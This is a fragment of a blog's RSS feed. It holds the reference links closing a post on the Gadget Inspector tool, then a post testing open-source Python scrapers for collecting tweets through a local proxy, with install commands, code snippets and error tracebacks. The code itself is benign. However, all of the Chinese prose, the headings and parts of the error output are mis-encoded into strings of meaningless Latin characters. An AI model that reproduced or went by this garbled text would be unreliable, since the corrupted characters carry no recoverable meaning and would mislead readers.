href="https://asm.ow2.io/javadoc/org/objectweb/asm/ClassReader.html">Class ClassReader</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/ClassVisitor.html">Class ClassVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/MethodVisitor.html">Class MethodVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/FieldVisitor.html">Class FieldVisitor</a></li><li><a href="https://asm.ow2.io/javadoc/org/objectweb/asm/commons/JSRInlinerAdapter.html">Class JSRInlinerAdapter</a></li><li><a href="https://paper.seebug.org/1034/">Java ååºåˆ—åŒ–å·¥å…· gadgetinspector åˆçª¥</a></li><li><a href="http://galaxylab.pingan.com.cn/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%E4%B9%8B-gadgetinspector/">Javaååºåˆ—åŒ–æ¼æ´è¾…åŠ©å·¥å…·ä¹‹ gadgetinspector</a></li><li><a href="https://threedr3am.github.io/2020/01/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7gadgetinspector%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">javaååºåˆ—åŒ–åˆ©ç”¨é“¾è‡ªåŠ¨æŒ–æ˜å·¥å…·gadgetinspectoræºç æµ…æ</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Security/">Security</category>
      
      
      <category domain="https://jckling.github.io/tags/Java/">Java</category>
      
      
      <comments>https://jckling.github.io/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Python çˆ¬å– twitter æ•°æ®</title>
      <link>https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/</link>
      <guid>https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/</guid>
      <pubDate>Mon, 11 Oct 2021 10:44:50 GMT</pubDate>
      
      <description>æŒ‚ä»£ç†çˆ¬å–æ¨æ–‡</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ¥åˆ°ä¸€ä¸ªéœ€æ±‚ï¼šçˆ¬åŒ…å«å…³é”®å­—çš„æ¨æ–‡ã€‚åæ¥æ‰å‘Šè¯‰æˆ‘è½¬äº¤ç»™åˆ«äººåšäº†ï¼ˆæ‘Šæ‰‹ï¼‰ï¼Œé‚£è¿™é‡Œå°±åˆ†äº«ä¸€ä¸‹å¦‚ä½•çˆ¬å– twitter æ•°æ®ã€‚<br><em>ç»“æœæˆ‘æ‹–äº†ä¸¤å‘¨æ‰å¼€å§‹æ¢³ç†</em> ğŸ˜‚</p><h1 id="Twitter-API"><a href="#Twitter-API" class="headerlink" title="Twitter API"></a>Twitter API</h1><p>æ¨ç‰¹æä¾›äº† Twitter APIï¼Œå¯ä»¥ç”¨äºæŸ¥è¯¢æ¨ç‰¹æ•°æ®ï¼Œä¸ªäººä½¿ç”¨çš„è¯æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š</p><ol><li>Twitter API v2</li><li>Standard v1.1</li></ol><p>å½“ç„¶è¿˜æœ‰é«˜çº§ç‰ˆå’Œä¼ä¸šç‰ˆï¼š</p><ol><li>Premium v1.1</li><li>Enterprise</li></ol><p>æ ‡å‡†ç‰ˆä»…æ”¯æŒæœç´¢ 7 å¤©å†…çš„æ¨ç‰¹ï¼Œå…¶ä½™éƒ½æ”¯æŒå…¨æœç´¢ï¼ˆä» 2006.03 å¼€å§‹ï¼‰ï¼Œå®˜æ–¹ç»™å‡ºäº†æ¯”è¾ƒï¼š<a href="https://developer.twitter.com/en/docs/twitter-api/tweets/search/migrate">Comparing Twitter APIâ€™s Search Tweets endpoints</a> ã€‚</p><p>ä½¿ç”¨æ ‡å‡†ç‰ˆéœ€è¦ç”³è¯·å¼€å‘è€…è´¦æˆ·<a href="https://developer.twitter.com/en/apply/user.html">Apply for a developer account</a>ï¼Œä½¿ç”¨ v2 ç‰ˆæœ¬çš„éœ€è¦ç”³è¯· <a href="https://developer.twitter.com/en/products/twitter-api/academic-research">Academic Research product track</a>ã€‚æˆ‘è¯•äº†ç”³è¯·å¼€å‘è€…è´¦æˆ·ï¼Œç„¶åå¦¥å¦¥åœ°è¢«æ‹’ç»äº†ï¼Œæœ‰äººè¯´éœ€è¦ç¾å›½è´¦æˆ·&#x2F;æ‰‹æœºå·ä¹‹ç±»çš„ä¿¡æ¯ï¼Œå› ä¸ºä¸æƒ³æ‹¿è‡ªç”¨çš„æ¨ç‰¹çæµ‹è¯•ï¼Œä¹Ÿå°±ç½¢äº†ã€‚</p><img src="https://i.loli.net/2021/10/11/YouCXye5JHLgNDZ.png" width="85%"><p>è¿™é‡Œçš„ç›®æ ‡æ˜¯æœç´¢ç‰¹å®šæ—¶é—´èŒƒå›´å†…ï¼ŒåŒ…å«ç‰¹å®šå…³é”®è¯çš„ tweetsï¼ˆå³ï¼Œæ¨æ–‡ï¼‰ï¼Œå› æ­¤å°±ç®—ç”³è¯·åˆ°äº†ä¹Ÿä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œè½¬è€Œå¯»æ±‚å¼€æºè§£å†³æ–¹æ¡ˆã€‚</p><h1 id="å¼€æºè§£å†³æ–¹æ¡ˆ"><a href="#å¼€æºè§£å†³æ–¹æ¡ˆ" class="headerlink" title="å¼€æºè§£å†³æ–¹æ¡ˆ"></a>å¼€æºè§£å†³æ–¹æ¡ˆ</h1><p>æœç´¢ GitHub ä¸Šçˆ¬å– twitter æ•°æ®çš„å¼€æºé¡¹ç›®ï¼Œç­›é€‰å‡ºä»¥ä¸‹ 9 ä¸ªè¯•ç”¨ï¼ˆæŒ‰ star æ•°é‡æ’åˆ—ï¼‰ï¼š</p><table><thead><tr><th>åç§°</th><th>star</th><th>æœ€åä¸€æ¬¡æ›´æ–°</th><th>æ˜¯å¦å¯ç”¨</th></tr></thead><tbody><tr><td><a href="https://github.com/twintproject/twint">twint</a></td><td>13k</td><td>2021.03.03</td><td>âŒ</td></tr><tr><td><a href="https://github.com/tweepy/tweepy">tweepy</a></td><td>8.7k</td><td>2022.04.22</td><td>âœ”ï¸ï¼ˆéœ€è¦ç”³è¯· Twitter APIï¼‰</td></tr><tr><td><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></td><td>3.2k</td><td>2021.12.18</td><td>âŒ</td></tr><tr><td><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></td><td>2k</td><td>2020.07.28</td><td>âŒ</td></tr><tr><td><a href="https://github.com/Altimis/Scweet">Scweet</a></td><td>383</td><td>2022.03.23</td><td>âœ”ï¸</td></tr><tr><td><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></td><td>146</td><td>2020.06.04</td><td>âŒ</td></tr><tr><td><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></td><td>75</td><td>2020.12.16</td><td>âŒ</td></tr><tr><td><a href="https://github.com/markowanga/stweet">stweet</a></td><td>99</td><td>2021.10.14</td><td>âœ”ï¸</td></tr><tr><td><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></td><td>6</td><td>2019.12.15</td><td>âŒ</td></tr></tbody></table><h2 id="twint"><a href="#twint" class="headerlink" title="twint"></a><a href="https://github.com/twintproject/twint">twint</a></h2><p>ä¸ç”¨ Twitter API çˆ¬å–æ¨æ–‡ï¼Œæ”¯æŒæ ‡ç­¾ã€è¶‹åŠ¿ã€æ•æ„Ÿä¿¡æ¯ç­‰æœç´¢é€‰é¡¹ï¼Œä¹Ÿæ”¯æŒçˆ¬å–ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…³æ³¨è€…ã€æ¨æ–‡ã€‚</p><ol><li><p>å®‰è£…</p><p> ç›´æ¥ä» pypi å®‰è£…çš„åŒ…ç‰ˆæœ¬è¾ƒä½ï¼Œéœ€è¦å‡çº§</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade git+https://github.com/twintproject/twint.git@origin/master<span class="comment">#egg=twint</span></span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> é…ç½®ä¸€ä¸ªä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> twint</span><br><span class="line"></span><br><span class="line">c = twint.Config()</span><br><span class="line">c.Proxy_host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">c.Proxy_port = <span class="string">&#x27;7890&#x27;</span></span><br><span class="line">c.Proxy_type = <span class="string">&#x27;http&#x27;</span></span><br><span class="line"></span><br><span class="line">c.Store_csv = <span class="literal">True</span></span><br><span class="line">c.Output = <span class="string">&quot;tweets.csv&quot;</span></span><br><span class="line"></span><br><span class="line">c.Limit = <span class="number">10</span></span><br><span class="line">c.Custom_query = <span class="string">&quot;nijisanji&quot;</span></span><br><span class="line"></span><br><span class="line">twint.run.Search(c)</span><br></pre></td></tr></table></figure><p> ç„¶åæŒ‚æ‰</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING:root:Error retrieving https://twitter.com/: ConnectTimeout(MaxRetryError(<span class="string">&quot;HTTPSConnectionPool(host=&#x27;twitter.com&#x27;, port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPSConnection object at 0x000001D2C5A295B0&gt;, &#x27;Connection to twitter.com timed out. (connect timeout=10)&#x27;))&quot;</span>)), retrying</span><br></pre></td></tr></table></figure><p> ç¿»äº†ç¿» issue æœ‰äººåœ¨äºŒæœˆä»½ä¿®å¤äº†ï¼š<a href="https://github.com/twintproject/twint/pull/1138">Fix the bug that proxy cannot be used when get token #1138</a>ï¼Œä½†æ²¡æœ‰åˆå¹¶ã€‚</p><p> é¡ºä¾¿å‘ç°æœ‰äººæè®¾ç½®æ—¶é—´èŒƒå›´çš„ <code>since</code> å’Œ <code>until</code> å¤±æ•ˆäº†</p><ul><li><a href="https://github.com/twintproject/twint/issues/1281">c.Since and c.Until not getting all tweets #1281</a></li><li><a href="https://github.com/twintproject/twint/issues/1261">Since~Until doesnâ€™t work anymore #1261</a></li></ul></li><li><p>æ€»ç»“</p><p> è‡ªå·±è¯•ç€ä¿®æ”¹æˆ–è€…ç­‰ä¸€ä¸ªå¤§æ›´æ–°ï¼Œå››ç™¾å¤šçš„ issue çœ‹æ¥æ˜¯æ²¡æœ‰å¤ªå¤šçš„ç²¾åŠ›ä¿®å•ŠğŸ˜…</p></li></ol><h2 id="tweepy"><a href="#tweepy" class="headerlink" title="tweepy"></a><a href="https://github.com/tweepy/tweepy">tweepy</a></h2><p>å®é™…ä¸Šå°±æ˜¯å¯¹ twitter API çš„å°è£…ï¼Œä¸ç”¨ä»é›¶æ‰‹å†™è¯·æ±‚å’Œå¤„ç†æ•°æ®ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tweepy</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> æ²¡æœ‰ç”³è¯·åˆ°å¼€å‘è€…è´¦æˆ·ï¼Œè·³è¿‡ï¼</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tweepy</span><br><span class="line"></span><br><span class="line">auth = tweepy.OAuthHandler(consumer_key, consumer_secret)</span><br><span class="line">auth.set_access_token(access_token, access_token_secret)</span><br><span class="line"></span><br><span class="line">api = tweepy.API(auth)</span><br><span class="line"></span><br><span class="line">public_tweets = api.home_timeline()</span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> public_tweets:</span><br><span class="line">    <span class="built_in">print</span>(tweet.text)</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“</p><p> Twitter API v2 çš„æ”¯æŒè¿˜åœ¨å¼€å‘ä¸­ï¼Œç”³è¯·åˆ°å¼€å‘è€…è´¦æˆ·çš„å°±ç”¨å®ƒå§ï¼</p></li></ol><h2 id="twitter-scraper"><a href="#twitter-scraper" class="headerlink" title="twitter-scraper"></a><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></h2><p>æ”¯æŒæ ‡ç­¾ã€è¶‹åŠ¿ç­‰æœç´¢é€‰é¡¹ï¼Œä¹Ÿæ”¯æŒç”¨æˆ·ä¿¡æ¯çš„æœç´¢ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitter_scraper</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> å› ä¸ºæ²¡æœ‰æä¾›è®¾å€¼ä»£ç†çš„é€‰é¡¹ï¼Œæ‰€ä»¥ç›´æ¥åœ¨æœ¬åœ°å¼€å…¨å±€æ¨¡å¼ä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twitter_scraper <span class="keyword">import</span> get_tweets</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> get_tweets(<span class="string">&#x27;twitter&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(tweet[<span class="string">&#x27;text&#x27;</span>])</span><br></pre></td></tr></table></figure><p> æŠ¥é”™ğŸ˜…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ProxyError: HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /i/profiles/show/twitter/timeline/tweets?include_available_features=1&amp;include_entities=1&amp;include_new_items_bar=<span class="literal">true</span> (Caused by ProxyError(<span class="string">&#x27;Cannot connect to proxy.&#x27;</span>, OSError(0, <span class="string">&#x27;Error&#x27;</span>)))</span><br></pre></td></tr></table></figure><p> æ”¹ä¸‹æºç ï¼ŒæŠ¥é”™åœ¨ tweets.py è¿™ä¸ªæ–‡ä»¶ï¼Œæ·»åŠ ä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_tweets</span>(<span class="params">query, pages=<span class="number">25</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_tweets</span>(<span class="params">pages</span>):</span><br><span class="line">        proxy = <span class="string">&#x27;http://127.0.0.1:7890&#x27;</span></span><br><span class="line">        r = session.get(url, headers=headers, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: proxy, <span class="string">&#x27;https&#x27;</span>: proxy&#125;)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p> é‡æ–°æ‰§è¡Œï¼Œæ–°çš„æŠ¥é”™ğŸ˜…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“</p><p> ä½œè€…è¯´ç°åœ¨å·²ç»æ— æ³•ä½¿ç”¨äº†ï¼ˆ<a href="https://github.com/bisguzar/twitter-scraper/issues/191">Does this work? #191</a>ï¼‰ï¼Œè€Œä¸”è‡ªå·±å¿™äºå·¥ä½œæš‚æ—¶æ²¡æ—¶é—´æ›´æ–°ï¼ˆ<a href="https://github.com/bisguzar/twitter-scraper/issues/189#issuecomment-832690515">Doesnâ€™t scrap anything. #189</a>ï¼‰ï¼Œæš‚ä¸”è§‚æœ›å§ã€‚</p></li></ol><h2 id="twitterscraper"><a href="#twitterscraper" class="headerlink" title="twitterscraper"></a><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></h2><p>æ‰€ä»¥ä¸ºä»€ä¹ˆè¦èµ·ä¸€æ ·çš„åå­—ï¼Ÿï¼</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitterscraper</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> ç›´æ¥ä¸Šå‘½ä»¤è¡Œäº†ï¼Œä½†æ˜¯æ— æ³•è®¿é—®é»˜è®¤ä»£ç† <a href="https://free-proxy-list.net/">https://free-proxy-list.net</a></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twitterscraper Trump --<span class="built_in">limit</span> 1000 --output=tweets.json</span><br></pre></td></tr></table></figure><p> æŠ¥é”™</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectionError: HTTPSConnectionPool(host=<span class="string">&#x27;free-proxy-list.net&#x27;</span>, port=443): Max retries exceeded with url: / (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x0000019FAE33BDC0&gt;: Failed to establish a new connection: [WinError 10060] ç”±äºè¿æ¥æ–¹åœ¨ä¸€æ®µæ—¶é—´åæ²¡æœ‰æ­£ç¡®ç­”å¤æˆ–è¿æ¥çš„ä¸»æœºæ²¡æœ‰ååº”ï¼Œè¿æ¥å°è¯•å¤±è´¥ã€‚&#x27;</span>))</span><br></pre></td></tr></table></figure><p> ä¿®æ”¹æºç  query.pyï¼Œç›´æ¥è¿”å›æœ¬åœ°ä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_proxies</span>():</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;127.0.0.1:7890&#x27;</span>]</span><br><span class="line">    response = requests.get(PROXY_URL)</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    table = soup.find(<span class="string">&#x27;table&#x27;</span>,<span class="built_in">id</span>=<span class="string">&#x27;proxylisttable&#x27;</span>)</span><br><span class="line">    list_tr = table.find_all(<span class="string">&#x27;tr&#x27;</span>)</span><br><span class="line">    list_td = [elem.find_all(<span class="string">&#x27;td&#x27;</span>) <span class="keyword">for</span> elem <span class="keyword">in</span> list_tr]</span><br><span class="line">    list_td = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="literal">None</span>, list_td))</span><br><span class="line">    list_ip = [elem[<span class="number">0</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_ports = [elem[<span class="number">1</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_proxies = [<span class="string">&#x27;:&#x27;</span>.join(elem) <span class="keyword">for</span> elem <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(list_ip, list_ports))]</span><br><span class="line">    <span class="keyword">return</span> list_proxies               </span><br></pre></td></tr></table></figure><p> è¾“å‡ºè¯·æ±‚å‚æ•°ï¼Œç„¶åæŠ¥é”™â€¦</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">INFO:twitterscraper:queries: [<span class="string">&#x27;Trump since:2006-03-21 until:2006-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2006-12-30 until:2007-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2007-10-10 until:2008-07-20&#x27;</span>, <span class="string">&#x27;Trump since:2008-07-20 until:2009-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2009-04-30 until:2010-02-08&#x27;</span>, <span class="string">&#x27;Trump since:2010-02-08 until:2010-11-19&#x27;</span>, <span class="string">&#x27;Trump since:2010-11-19 until:2011-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2011-08-31 until:2012-06-10&#x27;</span>, <span class="string">&#x27;Trump since:2012-06-10 until:2013-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2013-03-21 until:2013-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2013-12-30 until:2014-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2014-10-10 until:2015-07-21&#x27;</span>, <span class="string">&#x27;Trump since:2015-07-21 until:2016-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2016-04-30 until:2017-02-09&#x27;</span>, <span class="string">&#x27;Trump since:2017-02-09 until:2017-11-20&#x27;</span>, <span class="string">&#x27;Trump since:2017-11-20 until:2018-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2018-08-31 until:2019-06-11&#x27;</span>, <span class="string">&#x27;Trump since:2019-06-11 until:2020-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2020-03-21 until:2020-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2020-12-30 until:2021-10-11&#x27;</span>]</span><br><span class="line">ConnectionError HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /search?f=tweets&amp;vertical=default&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x000002975B91D430&gt;: Failed to establish a new connection: [WinError 10060] ç”±äºè¿æ¥æ–¹åœ¨ä¸€æ®µæ—¶é—´</span></span><br><span class="line"><span class="string">åæ²¡æœ‰æ­£ç¡®ç­”å¤æˆ–è¿æ¥çš„ä¸»æœºæ²¡æœ‰ååº”ï¼Œè¿æ¥å°è¯•å¤±è´¥ã€‚&#x27;</span>)) <span class="keyword">while</span> requesting <span class="string">&quot;https://twitter.com/search?f=tweets&amp;vertical=defa</span></span><br><span class="line"><span class="string">ult&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None&quot;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connection.py&quot;</span>, line 174, <span class="keyword">in</span> _new_conn</span><br><span class="line">    conn = connection.create_connection(</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 96, <span class="keyword">in</span> create_connection</span><br><span class="line">    raise err</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 86, <span class="keyword">in</span> create_connection</span><br><span class="line">    sock.connect(sa)</span><br><span class="line">TimeoutError: [WinError 10060] ç”±äºè¿æ¥æ–¹åœ¨ä¸€æ®µæ—¶é—´åæ²¡æœ‰æ­£ç¡®ç­”å¤æˆ–è¿æ¥çš„ä¸»æœºæ²¡æœ‰ååº”ï¼Œè¿æ¥å°è¯•å¤±è´¥ã€‚</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“ </p><p> ç¿»äº†ç¿» issueï¼šæ²¡æ³•ç”¨ï¼Œç­‰æ›´æ–°ã€‚</p></li></ol><h2 id="Scweet"><a href="#Scweet" class="headerlink" title="Scweet"></a><a href="https://github.com/Altimis/Scweet">Scweet</a></h2><p>æ”¯æŒå…³é”®è¯ã€æ ‡ç­¾ã€æ—¶é—´èŒƒå›´ç­‰æœç´¢é€‰é¡¹ï¼Œä¹Ÿæ”¯æŒç”¨æˆ·ä¿¡æ¯ã€å…³æ³¨ã€å…³æ³¨è€…çš„çˆ¬å–ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Scweet==1.6</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> ç”¨ selenium æ¨¡æ‹Ÿæµè§ˆå™¨è®¿é—®ï¼Œç«Ÿç„¶è¿˜ä¸æ˜¯ headless æ¨¡å¼ï¼Œç›´æ¥ç»™æˆ‘å¼¹å‡ºä¸€ä¸ªçª—å£å¯è¿˜è¡Œã€‚æ³¨æ„è¿™é‡Œä¸æ˜¯æœ¬åœ°æ—¶é—´ï¼Œæ˜¯ UTC æ—¶é—´ï¼›å­˜å‚¨æ ¼å¼ä¸º UTF-8ã€‚</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Scweet.scweet <span class="keyword">import</span> scrape</span><br><span class="line"></span><br><span class="line">data = scrape(words=[<span class="string">&quot;nijisanji&quot;</span>], since=<span class="string">&quot;2020-01-01&quot;</span>, until=<span class="string">&quot;2021-01-01&quot;</span>, from_account=<span class="literal">None</span>,</span><br><span class="line">            interval=<span class="number">1</span>,</span><br><span class="line">            headless=<span class="literal">False</span>, display_type=<span class="string">&quot;Latest&quot;</span>, save_images=<span class="literal">False</span>, proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>, save_dir=<span class="string">&#x27;outputs&#x27;</span>,</span><br><span class="line">            resume=<span class="literal">False</span>, filter_replies=<span class="literal">True</span>, proximity=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p> ç»“æœçˆ¬äº† 175 æ¡æ•°æ®</p> <img src="https://i.loli.net/2021/10/11/iO3AjzBJUMm8th4.png"></li><li><p>æ€»ç»“</p><p> å¯ä»¥ç”¨ï¼æš‚æ—¶æ²¡é‡åˆ°ä»€ä¹ˆé—®é¢˜ï¼Œç”¨å®ƒï¼</p></li></ol><h2 id="SearchTT"><a href="#SearchTT" class="headerlink" title="SearchTT"></a><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></h2><p>è¿˜å†™äº†ä¸€ç¯‡çŸ¥ä¹æ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/87931509">è¿™å¯èƒ½æ˜¯æ˜¯ä¸­æ–‡ç½‘ä¸Šå…³äºTwitterä¿¡æ¯æ£€ç´¢çˆ¬è™«æœ€å…¨çš„é¡¹ç›®äº†</a></p><p>æè¿°å«ç³Šã€ä»“åº“ä¸æ›´æ–°ã€ç”šè‡³è¿˜æ›¾å‡ºç§Ÿ APIï¼ˆè¯„è®ºé‡Œçœ‹èµ·æ¥å¯èƒ½æ˜¯ï¼‰ï¼Œæ‹‰å€’ğŸ™ƒã€‚</p><h2 id="Twitter-Hashtag-crawler"><a href="#Twitter-Hashtag-crawler" class="headerlink" title="Twitter Hashtag crawler"></a><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></h2><p>æ ¹æ®æ ‡ç­¾ï¼ˆhashtagï¼‰æœç´¢</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/amitupreti/Hands-on-WebScraping</span><br><span class="line"><span class="built_in">cd</span> Hands-on-WebScraping/project1_twitter_hashtag_crawler</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p> æŠ¥é”™</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Could not find a version that satisfies the requirement dateutil (from versions: none)</span><br><span class="line">ERROR: No matching distribution found <span class="keyword">for</span> dateutil</span><br></pre></td></tr></table></figure><p> ä½†æ˜¯æœ¬åœ°å·²ç»æœ‰äº† dateutil</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install python-dateutil --upgrade</span><br><span class="line"><span class="comment"># Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span 